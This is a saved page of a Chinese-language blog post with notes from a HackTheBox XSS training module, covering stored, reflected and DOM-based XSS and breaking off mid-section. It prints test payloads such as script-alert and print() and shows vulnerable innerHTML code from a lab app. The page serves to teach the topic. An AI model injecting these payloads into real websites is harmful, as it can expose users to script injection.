@@ -1,0 +1,717 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Cross-Site Scripting (XSS)HTB | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="XSS Basics随着Web应用程序变得越来越先进和普遍，Web应用程序漏洞也越来越多。最常见的Web应用程序漏洞类型是跨站点脚本（XSS）漏洞。XSS漏洞利用用户输入清理中的缺陷将JavaScript代码“写入”页面并在客户端执行，从而导致多种类型的攻击。 What is XSS典型的Web应用程序通过从后端服务器接收HTML代码并将其呈现在客户端互联网浏览器上来工作。当易受攻击的Web应用程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cross-Site Scripting (XSS)HTB">
+<meta property="og:url" content="http://mikannse.space/2023/11/17/Cross-Site%20Scripting%20(XSS)HTB/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="XSS Basics随着Web应用程序变得越来越先进和普遍，Web应用程序漏洞也越来越多。最常见的Web应用程序漏洞类型是跨站点脚本（XSS）漏洞。XSS漏洞利用用户输入清理中的缺陷将JavaScript代码“写入”页面并在客户端执行，从而导致多种类型的攻击。 What is XSS典型的Web应用程序通过从后端服务器接收HTML代码并将其呈现在客户端互联网浏览器上来工作。当易受攻击的Web应用程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2023-11-17T13:03:41.000Z">
+<meta property="article:modified_time" content="2023-11-17T13:47:43.211Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="网安">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2023/11/17/Cross-Site%20Scripting%20(XSS)HTB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Cross-Site Scripting (XSS)HTB',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2023-11-17 21:47:43'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Cross-Site Scripting (XSS)HTB</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-17T13:03:41.000Z" title="发表于 2023-11-17 21:03:41">2023-11-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-17T13:47:43.211Z" title="更新于 2023-11-17 21:47:43">2023-11-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">13.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>47分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Cross-Site Scripting (XSS)HTB"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="XSS-Basics"><a href="#XSS-Basics" class="headerlink" title="XSS Basics"></a>XSS Basics</h1><p>随着Web应用程序变得越来越先进和普遍，Web应用程序漏洞也越来越多。最常见的Web应用程序漏洞类型是<a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/xss/">跨站点脚本（XSS）</a>漏洞。XSS漏洞利用用户输入清理中的缺陷将JavaScript代码“写入”页面并在客户端执行，从而导致多种类型的攻击。</p>
+<h2 id="What-is-XSS"><a href="#What-is-XSS" class="headerlink" title="What is XSS"></a>What is XSS</h2><p>典型的Web应用程序通过从后端服务器接收HTML代码并将其呈现在客户端互联网浏览器上来工作。当易受攻击的Web应用程序没有正确地清理用户输入时，恶意用户可以在输入字段中注入额外的JavaScript代码（例如，评论/回复），因此一旦另一个用户查看同一页面，他们就会在不知不觉中执行恶意JavaScript代码。</p>
+<p>XSS漏洞仅在客户端执行，因此不会直接影响后端服务器。它们只能影响执行漏洞的用户。XSS漏洞对后端服务器的直接影响可能相对较低，但它们在Web应用程序中非常常见，因此这相当于中等风险（<code>low impact + high probability = medium risk</code>），我们应该始终尝试通过检测，修复和主动预防这些类型的漏洞来降低<code>reduce</code>风险。</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_risk_chart_1.jpg" alt="xss risk"></p>
+<h3 id="XSS-Attacks"><a href="#XSS-Attacks" class="headerlink" title="XSS Attacks"></a>XSS Attacks</h3><p>XSS漏洞可以促进广泛的攻击，这些攻击可以是任何可以通过浏览器JavaScript代码执行的东西。XSS攻击的一个基本示例是让目标用户在不知情的情况下将其会话cookie发送到攻击者的Web服务器。另一个例子是让目标浏览器执行导致恶意操作的API调用，例如将用户密码更改为攻击者选择的密码。还有许多其他类型的XSS攻击，从比特币挖矿到显示广告。</p>
+<p>由于XSS攻击在浏览器内执行JavaScript代码，因此它们仅限于浏览器的JS引擎（即，Chrome中的V8）。它们不能执行系统范围的JavaScript代码来执行类似于系统级代码执行的操作。在现代浏览器中，它们也仅限于易受攻击网站的同一域。然而，如上所述，能够在用户的浏览器中执行JavaScript仍然可能导致各种各样的攻击。除此之外，如果熟练的研究人员识别出web浏览器中的二进制漏洞（例如，Chrome中的堆溢出），他们可以利用XSS漏洞在目标浏览器上执行JavaScript漏洞，最终突破浏览器的沙箱并在用户机器上执行代码。</p>
+<p>XSS漏洞几乎可以在所有现代Web应用程序中找到，并且在过去二十年中一直被积极利用。一个著名的XSS例子是<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Samy_(computer_worm)">Samy Worm</a>，这是一种基于浏览器的蠕虫，它在2005年利用了社交网站MySpace中存储的XSS漏洞。当浏览受感染的网页时，它会在受害者的MySpace页面上发布一条消息，上面写着：“Samy是我的英雄。“消息本身也包含相同的JavaScript有效载荷，以便在其他人查看时重新发布相同的消息。在一天之内，超过一百万MySpace用户在他们的页面上发布了这条消息。尽管这个特定的有效载荷没有造成任何实际伤害，但该漏洞可能被用于更邪恶的目的，例如窃取用户的信用卡信息，在浏览器上安装密钥记录器，甚至利用用户Web浏览器中的二进制漏洞（这在当时的Web浏览器中更常见）。</p>
+<p>2014年，一名安全研究人员意外地在Twitter的TweetDeck仪表板中发现了一个<a target="_blank" rel="noopener" href="https://blog.sucuri.net/2014/06/serious-cross-site-scripting-vulnerability-in-tweetdeck-twitter.html">XSS漏洞</a>。利用这个漏洞在Twitter中创建了一条<a target="_blank" rel="noopener" href="https://twitter.com/derGeruhn/status/476764918763749376">自我转发的推文</a>，导致该推文在不到两分钟的时间内被转发了38，000多次。最终，它迫使Twitter<a target="_blank" rel="noopener" href="https://www.theguardian.com/technology/2014/jun/11/twitter-tweetdeck-xss-flaw-users-vulnerable">暂时关闭TweetDeck</a>，同时修补漏洞。</p>
+<p>直到今天，即使是最突出的Web应用程序也有可能被利用的XSS漏洞。就连谷歌的搜索引擎页面，其搜索栏中也出现了多个XSS漏洞，最近一次是在<a target="_blank" rel="noopener" href="https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/">2019</a>年，在XML库中发现了一个XSS漏洞。此外，互联网上最常用的Web服务器Apache Server曾经报告过一个<a target="_blank" rel="noopener" href="https://blogs.apache.org/infra/entry/apache_org_04_09_2010">XSS漏洞</a>，该漏洞被积极利用来窃取某些公司的用户密码。所有这些都告诉我们，XSS漏洞应该得到认真对待，并且应该在检测和预防它们方面投入大量的努力。</p>
+<h3 id="XSS的类型"><a href="#XSS的类型" class="headerlink" title="XSS的类型"></a>XSS的类型</h3><p>XSS漏洞主要有三种类型：</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Stored (Persistent) XSS</code></td>
+<td>最关键的XSS类型，当用户输入存储在后端数据库中，然后在检索时显示时发生（例如，帖子或评论）</td>
+</tr>
+<tr>
+<td><code>Reflected (Non-Persistent) XSS</code></td>
+<td>当用户输入在被后端服务器处理之后被显示在页面上，但是没有被存储（例如，搜索结果或错误信息）</td>
+</tr>
+<tr>
+<td><code>DOM-based XSS</code></td>
+<td>另一种非持久性XSS类型，当用户输入直接显示在浏览器中并在客户端完全处理时发生，而不到达后端服务器（例如，通过客户端HTTP参数或锚标记）</td>
+</tr>
+</tbody></table>
+<p>我们将在接下来的章节中介绍每种类型，并通过练习来了解它们是如何发生的，然后我们还将了解如何在攻击中利用它们。</p>
+<h2 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h2><p>在我们学习如何发现XSS漏洞并利用它们进行各种攻击之前，我们必须首先了解不同类型的XSS漏洞及其差异，以了解在每种攻击中使用哪种漏洞。</p>
+<p>XSS漏洞的第一个也是最关键的类型是<code>Stored XSS</code>或<code>Persistent XSS</code>。如果我们注入的XSS负载存储在后端数据库中，并在访问页面时被检索，这意味着我们的XSS攻击是持久的，可能会影响访问页面的任何用户。</p>
+<p>这使得这种类型的XSS成为最关键的，因为它影响了更广泛的受众，因为访问页面的任何用户都将成为这种攻击的受害者。此外，存储的XSS可能不容易删除，并且可能需要从后端数据库中删除有效负载。</p>
+<p>我们可以启动下面的服务器来查看和练习一个存储的XSS示例。正如我们所看到的，网页是一个简单的<code>To-Do List</code>应用程序，我们可以添加项目。我们可以尝试输入<code>test</code>并按回车键来添加一个新项目，看看页面是如何处理的：                                                                                                                                                                                      <img src="https://academy.hackthebox.com/storage/modules/103/xss_stored_xss.jpg" alt="img"></p>
+<p>正如我们所看到的，我们的输入显示在页面上。如果没有对我们的输入进行清理或过滤，页面可能容易受到XSS的攻击。</p>
+<h3 id="XSS-Testing-Payloads"><a href="#XSS-Testing-Payloads" class="headerlink" title="XSS Testing Payloads"></a>XSS Testing Payloads</h3><p>我们可以使用以下基本XSS负载测试页面是否易受XSS攻击：</p>
+<p>Code: 验证码： htmlHTML</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">origin</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们使用这个有效负载，因为它是一个非常容易发现的方法，可以知道我们的XSS有效负载何时成功执行。假设页面允许任何输入，并且没有对其执行任何清理。在这种情况下，警报应该在我们输入负载或刷新页面后立即弹出，并显示正在执行的页面的URL：                                                      </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_stored_xss_alert.jpg" alt="img"></p>
+<p>正如我们所看到的，我们确实收到了警报，这意味着页面容易受到XSS的攻击，因为我们的有效负载成功执行。我们可以通过单击[<code>CTRL+U</code>]或右键单击并选择<code>View Page Source</code>查看页面源来进一步确认这一点，我们应该在页面源中看到我们的负载：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list-unstyled"</span> <span class="attr">id</span>=<span class="string">"todo"</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">origin</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>提示：</strong>许多现代Web应用程序利用跨域IFrame来处理用户输入，因此即使Web表单易受XSS攻击，它也不会成为主Web应用程序的漏洞。这就是为什么我们在警报框中显示<code>window.origin</code>的值，而不是像<code>1</code>这样的静态值。在这种情况下，警告框将显示它正在执行的URL，并将确认哪个表单是易受攻击的表单，以防使用IFrame。</p>
+<p>由于一些现代浏览器可能会在特定位置阻止<code>alert()</code> JavaScript函数，因此了解一些其他基本XSS有效负载来验证XSS的存在可能会很方便。一个这样的XSS负载是<code>&lt;plaintext&gt;</code>，它将停止呈现它后面的HTML代码，并将其显示为纯文本。另一个容易发现的有效负载是<code>&lt;script&gt;print()&lt;/script&gt;</code>，它将弹出浏览器打印对话框，这不太可能被任何浏览器阻止。尝试使用这些有效负载来了解它们的工作原理。您可以使用重置按钮删除任何当前的有效负载。</p>
+<p>要查看负载是否持久并存储在后端，我们可以刷新页面，看看是否再次收到警报。如果我们这样做，我们会看到即使在整个页面刷新过程中，我们也会不断收到警报，确认这确实是一个<code>Stored/Persistent XSS</code>漏洞。这并不是我们独有的，因为任何访问该页面的用户都会触发XSS负载并获得相同的警报。</p>
+<h2 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h2><p><code>Non-Persistent XSS</code>漏洞有两种类型：<code>Reflected XSS</code>，由后端服务器处理，<code>DOM-based XSS</code>，完全在客户端处理，永远不会到达后端服务器。与Persistent XSS不同，<code>Non-Persistent XSS</code>漏洞是临时的，不会通过页面刷新持续存在。因此，我们的攻击只影响目标用户，不会影响访问该页面的其他用户。</p>
+<p><code>Reflected XSS</code>当我们的输入到达后端服务器并返回给我们时，会出现漏洞，而不会被过滤或清理。在许多情况下，我们的整个输入可能会返回给我们，比如错误消息或确认消息。在这些情况下，我们可以尝试使用XSS负载来查看它们是否执行。然而，由于这些通常是临时消息，一旦我们从页面中移动，它们就不会再次执行，因此它们是<code>Non-Persistent</code>。                                                                                                             </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_reflected_1.jpg" alt="img"></p>
+<p>正如我们所看到的，我们得到了<code>Task 'test' could not be added.</code>，其中包括我们的输入<code>test</code>作为错误消息的一部分。如果我们的输入没有被过滤或净化，页面可能容易受到XSS的攻击。我们可以尝试使用上一节中使用的相同XSS负载，然后单击<code>Add</code>：                                                                                      </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_reflected_2.jpg" alt="img">                                                                                                </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_stored_xss_alert.jpg" alt="img"></p>
+<p>在本例中，我们看到错误消息现在显示为<code>Task '' could not be added.</code>。由于我们的payload是用<code>&lt;script&gt;</code>标签包装的，它不会被浏览器渲染，所以我们得到的是空的单引号<code>''</code>。我们可以再次查看页面源代码，以确认错误消息包含我们的XSS负载：</p>
+<p>Code: 验证码： htmlHTML</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list-unstyled"</span> <span class="attr">id</span>=<span class="string">"todo"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"padding-left:25px"</span>&gt;</span>Task '<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">origin</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>' could not be added.<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>正如我们所看到的，单引号确实包含了我们的XSS负载<code>'&lt;script&gt;alert(window.origin)&lt;/script&gt;'</code>。</p>
+<p>如果我们再次访问<code>Reflected</code>页面，错误消息不再出现，我们的XSS有效负载也不会执行，这意味着这个XSS漏洞确实是<code>Non-Persistent</code>。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">But if the XSS vulnerability is Non-Persistent, how would we target victims with it?</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这取决于使用哪个HTTP请求将我们的输入发送到服务器。我们可以通过Firefox <code>Developer Tools</code>点击[<code>CTRL+I</code>]并选择<code>Network</code>标签来检查这一点。然后，我们可以再次放置<code>test</code>负载，并单击<code>Add</code>发送它：                                                                                                                                          </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_reflected_network.jpg" alt="img"></p>
+<p>正如我们所看到的，第一行显示我们的请求是<code>GET</code>请求。<code>GET</code> request将参数和数据作为URL的一部分发送。所以，3号。要获取URL，我们可以在发送XSS负载后从Firefox的URL栏中复制URL，或者右键单击<code>to target a user, we can send them a URL containing our payload</code>选项卡中的<code>GET</code>请求并选择<code>Network</code>。一旦受害者访问此URL，XSS有效负载将执行：                                    </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_stored_xss_alert.jpg" alt="img"></p>
+<h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><p>第三种也是最后一种类型的XSS是另一种名为<code>Non-Persistent</code>的<code>DOM-based XSS</code>类型。当<code>reflected XSS</code>通过HTTP请求将输入数据发送到后端服务器时，DOM XSS完全通过JavaScript在客户端处理。当使用JavaScript通过<code>Document Object Model (DOM)</code>更改页面源代码时，会发生DOM XSS。</p>
+<p>我们可以运行下面的服务器来查看一个易受DOM XSS攻击的Web应用程序的示例。我们可以尝试添加<code>test</code>项，我们看到Web应用程序类似于我们以前使用的<code>To-Do List</code> Web应用程序：</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_dom_1.jpg" alt="img"></p>
+<p>然而，如果我们打开Firefox开发者工具中的<code>Network</code>标签，并重新添加<code>test</code>项，我们会注意到没有HTTP请求被发出：                                                                                                                                     </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_dom_network.jpg" alt="img"></p>
+<p>我们看到URL中的输入参数为我们添加的项目使用了一个hashtag<code>#</code>，这意味着这是一个完全在浏览器上处理的客户端参数。这表明输入是在客户端通过JavaScript处理的，永远不会到达后端;因此它是<code>DOM-based XSS</code>。</p>
+<p>此外，如果我们通过点击[<code>CTRL+I</code>]查看页面源，我们会注意到我们的<code>test</code>字符串无处可寻。这是因为当我们点击<code>Add</code>按钮时，JavaScript代码正在更新页面，这是在我们的浏览器检索页面源之后，因此基本页面源不会显示我们的输入，如果我们刷新页面，它将不会被保留（即<code>Non-Persistent</code>）。我们仍然可以通过点击[<code>CTRL+SHIFT+C</code>]使用Web Inspector工具查看呈现的页面源代码：                                                                                                                                                                                      <img src="https://academy.hackthebox.com/storage/modules/103/xss_dom_inspector.jpg" alt="img"></p>
+<h3 id="Source-amp-Sink"><a href="#Source-amp-Sink" class="headerlink" title="Source &amp; Sink"></a>Source &amp; Sink</h3><p>为了进一步理解基于DOM的XSS漏洞的本质，我们必须理解页面上显示的对象的<code>Source</code>和<code>Sink</code>的概念。<code>Source</code>是接受用户输入的JavaScript对象，它可以是任何输入参数，如URL参数或输入字段，正如我们上面看到的。</p>
+<p>另一方面，<code>Sink</code>是将用户输入写入页面上的DOM Object的函数。如果<code>Sink</code>函数没有正确地清理用户输入，它将容易受到XSS攻击。写入DOM对象的一些常用JavaScript函数包括：</p>
+<ul>
+<li><code>document.write()</code></li>
+<li><code>DOM.innerHTML</code></li>
+<li><code>DOM.outerHTML</code></li>
+</ul>
+<p>此外，一些写入DOM对象的<code>jQuery</code>库函数是：</p>
+<ul>
+<li><code>add()</code></li>
+<li><code>after()</code></li>
+<li><code>append()</code></li>
+</ul>
+<p>如果一个<code>Sink</code>函数在没有任何清理的情况下写入了确切的输入（就像上面的函数一样），并且没有使用其他的清理方法，那么我们知道页面应该容易受到XSS的攻击。</p>
+<p>我们可以查看<code>To-Do</code> web应用程序的源代码，并检查<code>script.js</code>，我们将看到<code>Source</code>是从<code>task=</code>参数中获取的：</p>
+<p>Code: </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pos = <span class="variable language_">document</span>.<span class="property">URL</span>.<span class="title function_">indexOf</span>(<span class="string">"task="</span>);</span><br><span class="line"><span class="keyword">var</span> task = <span class="variable language_">document</span>.<span class="property">URL</span>.<span class="title function_">substring</span>(pos + <span class="number">5</span>, <span class="variable language_">document</span>.<span class="property">URL</span>.<span class="property">length</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在这些行的正下方，我们看到页面使用<code>innerHTML</code>函数将<code>task</code>变量写入<code>todo</code> DOM中：</p>
+<p>Code: </p>
